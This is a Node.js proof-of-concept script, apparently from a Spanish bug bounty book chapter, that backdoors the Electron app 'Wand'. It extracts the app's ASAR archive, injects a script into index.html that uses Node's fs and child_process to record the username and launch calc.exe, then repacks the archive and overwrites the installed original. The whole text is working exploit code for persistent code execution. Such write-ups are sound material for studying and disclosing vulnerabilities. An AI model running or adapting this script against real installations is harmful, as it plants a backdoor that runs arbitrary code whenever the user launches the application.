// Extraído de: LibroBugBounty/cap-25-caso-wand.md
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const wandRes = path.join(
    process.env.LOCALAPPDATA,
    'Wand', 'app-12.17.0', 'resources'
);
const asarOrig = path.join(wandRes, 'app.asar');
const asarBackup = path.join(wandRes, 'app.asar.original');
const tempDir = path.join(os.tmpdir(), 'wand_rce_poc');

// Restaurar backup si existe
if (fs.existsSync(asarBackup)) {
    fs.copyFileSync(asarBackup, asarOrig);
}

// Extraer ASAR
execSync(
    `npx asar extract "${asarOrig}" "${tempDir}"`,
    { stdio: 'pipe' }
);

// Inyectar payload en index.html
const htmlPath = path.join(tempDir, 'index.html');
let html = fs.readFileSync(htmlPath, 'utf8');

const payload = [
    '<script>',
    '(function(){',
    '  var fs=require("fs");',
    '  var cp=require("child_process");',
    '  var os=require("os");',
    '  var proof="C:\\\\Users\\\\Public\\\\wand_rce_proof.txt";',
    '  var info="WAND RCE PoC\\r\\n"',
    '    +"User: "+os.userInfo().username+"\\r\\n"',
    '    +"PID: "+process.pid+"\\r\\n"',
    '    +"Electron: "+(process.versions.electron)+"\\r\\n"',
    '    +"Node: "+(process.versions.node);',
    '  try{fs.writeFileSync(proof,info)}catch(e){}',
    '  try{cp.exec("calc.exe")}catch(e){}',
    '})();',
    '</script>',
].join('');

html = html.replace('<head>', '<head>' + payload);
fs.writeFileSync(htmlPath, html);

// Reempaquetar
const tempAsar = path.join(os.tmpdir(), 'wand_rce.asar');
execSync(
    `npx asar pack "${tempDir}" "${tempAsar}"`,
    { stdio: 'pipe' }
);

// Desplegar
fs.copyFileSync(asarOrig, asarBackup);
fs.copyFileSync(tempAsar, asarOrig);

console.log('[+] ASAR backdoored. Lanzar Wand para RCE.');
console.log('[*] calc.exe se abrira como prueba');
console.log('[*] Evidencia: C:\\Users\\Public\\wand_rce_proof.txt');
